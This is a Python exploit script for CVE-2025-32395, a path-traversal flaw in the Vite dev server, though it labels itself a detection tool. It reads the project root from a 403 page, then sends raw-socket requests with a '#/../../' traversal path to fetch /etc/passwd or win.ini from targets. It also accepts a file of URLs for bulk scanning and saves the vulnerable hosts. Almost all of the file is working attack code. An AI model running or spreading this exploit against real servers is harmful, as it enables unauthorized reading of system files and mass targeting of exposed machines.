import argparse
import re
import socket
import ssl
import http.client
import urllib.parse

def get_root_path(url, proxy=None):
    """
    Get the root path from the 403 error page
    :param url: target URL
    :param proxy: HTTP/HTTPS proxy
    :return: root path or None
    """
    try:
        parsed_url = urllib.parse.urlparse(url)
        target_path = "/@fs/tmp"
        
        # Make a request to the /@fs/tmp path to get the 403 page
        response = send_request(parsed_url.scheme, parsed_url.netloc, target_path, proxy)
        
        if response and response.status == 403:
            # Extract paths from the 403 page using regex
            body = response.read().decode('utf-8')
            paths = re.findall(r'-\s(.*?)<br/>', body)
            if paths:
                # Return the last matched path
                print("the_root_path_is"+":"+paths[-1])
                return paths[-1]
    except Exception as e:
        print(f"Error getting root path: {e}")
    
    return None

def send_request(scheme, host, path, proxy=None, use_socket=True, timeout=6):
    """
    Send HTTP/HTTPS request with timeout
    :param scheme: http or https
    :param host: target host
    :param path: target path
    :param proxy: HTTP/HTTPS proxy
    :param use_socket: whether to use socket (for # character)
    :param timeout: request timeout in seconds
    :return: HTTP response
    """
    if use_socket and '#' in path:
        # Use raw socket for requests containing # character
        try:
            port = 443 if scheme == 'https' else 80
            if ':' in host:
                host, port = host.split(':')
                port = int(port)
            
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Set socket timeout
            s.settimeout(timeout)
            
            if scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(s, server_hostname=host)
            
            s.connect((host, port))
            
            request = f"GET {path} HTTP/1.1\r\n"
            request += f"Host: {host}\r\n"
            request += "Connection: close\r\n\r\n"
            
            s.sendall(request.encode())
            
            response = b""
            while True:
                try:
                    data = s.recv(4096)
                    if not data:
                        break
                    response += data
                except socket.timeout:
                    print(f"Socket receive timed out after {timeout} seconds")
                    break
            
            s.close()
            
            # Parse the response
            if b'\r\n\r\n' in response:
                headers, body = response.split(b'\r\n\r\n', 1)
                return body
            return None
        except socket.timeout:
            print(f"Socket connection timed out after {timeout} seconds")
            return None
        except Exception as e:
            print(f"Socket error: {e}")
            return None
    else:
        # Use http.client for standard requests
        try:
            if scheme == 'https':
                conn = http.client.HTTPSConnection(host, context=ssl._create_unverified_context(), timeout=timeout)
            else:
                conn = http.client.HTTPConnection(host, timeout=timeout)
            
            conn.request("GET", path)
            return conn.getresponse()
        except socket.timeout:
            print(f"HTTP connection timed out after {timeout} seconds")
            return None
        except http.client.RemoteDisconnected:
            print("Remote server disconnected")
            return None
        except Exception as e:
            print(f"HTTP client error: {e}")
            return None

def check_vul(url, proxy=None):
    """
    Check if the target is vulnerable to CVE-2025-32395
    :param url: target URL
    :param proxy: HTTP/HTTPS proxy
    :return: file content if vulnerable, None otherwise
    """
    try:
        parsed_url = urllib.parse.urlparse(url)
        
        # Get the root path from the 403 page
        root_path = get_root_path(url, proxy)
        if not root_path:
            print(f"[-] Failed to get root path for {url}")
            return None
        
        # Construct the exploit path
        exploit_path = f"/@fs{root_path}/#/../../../../../etc/passwd"
        
        # Send request with socket to handle # character
        response = send_request(parsed_url.scheme, parsed_url.netloc, exploit_path, proxy)
        
        if response:
            response_text = response.decode('utf-8') if isinstance(response, bytes) else response
            
            # Check for Linux system (etc/passwd)
            if "root:x" in response_text:
                return response_text
            
            # If Linux check fails, try Windows
            exploit_path = f"/@fs{root_path}/#/../../../../../Windows/win.ini"
            response = send_request(parsed_url.scheme, parsed_url.netloc, exploit_path, proxy)
            
            if response:
                response_text = response.decode('utf-8') if isinstance(response, bytes) else response
                if "; for 16-bit app support" in response_text:
                    return response_text
    
    except Exception as e:
        print(f"Error checking vulnerability: {e}")
    
    return None

def main():
    # Define command line argument parser
    parser = argparse.ArgumentParser(description="CVE-2025-32395 Vite Path Traversal Vulnerability Detection Tool")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-f", "--file", help="File path containing multiple URLs")
    parser.add_argument("-p", "--proxy", help="HTTP/HTTPS proxy (e.g., http://127.0.0.1:8080)")
    
    # Parse command line arguments
    args = parser.parse_args()
    
    # Check user input
    if not args.url and not args.file:
        print("Error: You must provide either --url or --file parameter.")
        parser.print_help()
        return
    
    vulnerable_urls = []

    if args.url:
        print(f"[*] Testing URL: {args.url}")
        data = check_vul(args.url, args.proxy)
        if data:
            print(f"[+] {args.url} is vulnerable to CVE-2025-32395!")
            print(f"[+] File content:\n{data}")
            vulnerable_urls.append(args.url)
        else:
            print(f"[-] {args.url} is not vulnerable to CVE-2025-32395.")
    
    if args.file:
        try:
            with open(args.file, 'r') as f:
                for line in f:
                    url = line.strip()
                    if url:
                        print(f"[*] Testing URL: {url}")
                        data = check_vul(url, args.proxy)
                        if data:
                            print(f"[+] {url} is vulnerable to CVE-2025-32395!")
                            print(f"[+] File content preview: {data[:100]}...")
                            vulnerable_urls.append(url)
                        else:
                            print(f"[-] {url} is not vulnerable to CVE-2025-32395.")
        except FileNotFoundError:
            print(f"Error: File '{args.file}' not found.")
            return

    if vulnerable_urls:
        with open("web_test_ok.txt", 'w') as f:
            for url in vulnerable_urls:
                f.write(url + '\n')
        print("Vulnerable URLs have been saved to web_test_ok.txt")
    else:
        print("No vulnerable URLs found.")
if __name__ == '__main__':
    main()